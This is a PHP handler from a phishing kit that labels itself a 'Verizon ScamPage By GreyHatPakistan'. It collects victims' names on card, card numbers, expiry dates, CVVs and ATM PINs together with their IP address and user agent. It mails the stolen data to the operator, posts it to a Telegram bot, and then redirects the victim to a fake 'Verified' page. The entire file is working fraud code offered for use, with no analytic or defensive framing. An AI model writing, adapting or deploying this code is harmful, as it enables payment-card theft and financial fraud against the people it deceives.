<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['ccnum'] ) ) {
		
		$_SESSION['noc'] 	  = $_POST['noc'];
		$_SESSION['ccnum'] 	  = $_POST['ccnum'];
		$_SESSION['exp'] 	  = $_POST['exp'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['atmpin'] 	  = $_POST['atmpin'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 Verizon Credit Card ⚫️🌀 ]★　————-««
[Name On Card] 		: {$_SESSION['noc']}
[Card Number] 		: {$_SESSION['ccnum']}
[EXP]		: {$_SESSION['exp']}
[CVV] 		: {$_SESSION['cvv']}
[ATM Pin]		: {$_SESSION['atmpin']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 Verizon ScamPage By GreyHatPakistan ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ Verizon Credit Card By GreyHatPakistan🏛️  From $ip";
        $headers = "From: 🍁Greyhatpakistan🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}


        header("Location: ../Verified.php");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}


?>